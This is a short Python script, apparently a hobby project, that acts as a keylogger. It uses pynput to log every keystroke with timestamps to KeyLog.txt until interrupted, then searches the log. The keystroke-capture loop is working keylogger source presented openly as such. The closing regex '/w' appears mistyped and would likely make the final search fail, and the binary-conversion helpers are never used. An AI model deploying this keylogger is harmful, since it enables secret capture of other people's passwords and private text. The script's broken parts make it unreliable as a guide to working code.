from pynput.keyboard import Key, Listener
import logging
import re

# Function Definitions go under here

# on_press defines what is an event and what to log
def on_press(key):
    logging.info(str(key))

# Converts a decimal input into binary using recursion
def decimal_to_binary(num):
    return decimal_to_binary(num//2)+str(num%2) if num > 1 else str(num)

# Converts ascii data to binary, uses decimal_to_binary
def ascii_to_binary(character):
    ascii = ord(character)
    data = decimal_to_binary(ascii)
    length = 8 -(len(data))
    for i in range(length):
        data = "0" + data
    return data


# Main code starts from here

# Clearing the previous keylog and starting from scratch
open('KeyLog.txt', 'w').close()

logging.basicConfig(filename='KeyLog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
  
# This is the Keylogger functionality that breaks on ctrl+c
while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        break


key_log_file = open('KeyLog.txt', 'r').read()
keyRegex = re.compile('/w')

search = keyRegex.search(key_log_file)

print(search.group())        
